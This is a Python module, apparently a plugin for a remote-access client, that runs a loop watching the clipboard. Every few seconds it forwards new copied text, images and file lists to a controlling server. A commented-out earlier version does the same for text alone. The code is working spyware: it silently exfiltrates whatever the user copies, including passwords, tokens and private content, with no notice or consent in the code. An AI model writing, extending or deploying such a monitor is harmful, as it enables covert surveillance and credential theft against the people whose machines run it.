import hashlib
import io
import threading
import time

from PIL import ImageGrab, Image

from client.util.modules.module import Module
from common.util import get_size, logger


class ClipboardMonitor(Module):
    def __init__(self):
        super().__init__()
        self.recent_text = None
        self.image_hash = None
        self.file_list = None

    def run(self):
        try:
            self.send_to_server(1, 'Importing module: pyperclip', 0)
            import pyperclip
            self.send_to_server(1, 'Clipboard monitoring started', 1)
            self.status = True
            while self.status:
                im = ImageGrab.grabclipboard()
                if im is None:
                    clipboard_text = pyperclip.paste()
                    if clipboard_text != '' and clipboard_text != self.recent_text:
                        self.recent_text = clipboard_text
                        self.send_to_server(1, 'Clipboard change detected: {0}'.format(self.recent_text), 0)
                elif isinstance(im, Image.Image):
                    image_hash = hashlib.sha256(im.tobytes()).hexdigest()
                    if image_hash != self.image_hash:
                        self.image_hash = image_hash
                        b = io.BytesIO()
                        im.save(b, 'BMP')
                        self.send_to_server(1,
                                            f'Image copy detected, image being sent, length is {get_size(b.getbuffer().nbytes)}',
                                            0)
                        self.send_io_to_server(b)
                        self.send_to_server(1, 'Image has been successfully sent', 0)
                else:
                    if isinstance(im, list):
                        file_list = ', '.join(im)
                        if file_list != self.file_list:
                            self.file_list = file_list
                            self.send_to_server(1, f'Files copy detected: {self.file_list}', 0)
                    else:
                        print(f'Unsupported type: {im}')
                time.sleep(3)
            self.send_to_server(1, 'Clipboard monitoring stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)
        finally:
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)


"""
    def run(self):
        try:
            self.send_to_server(1, 'Importing module: pyperclip', 0)
            import pyperclip
            self.send_to_server(1, 'Clipboard monitoring started', 1)
            previous_data = pyperclip.paste()
            self.status = True
            while self.status:
                current_data = pyperclip.paste()
                if current_data != previous_data:
                    self.send_to_server(1, f'Clipboard content changed: {current_data}', 0)
                    previous_data = current_data
                time.sleep(1)
            self.send_to_server(1, 'Clipboard monitoring stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)
        self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)
"""
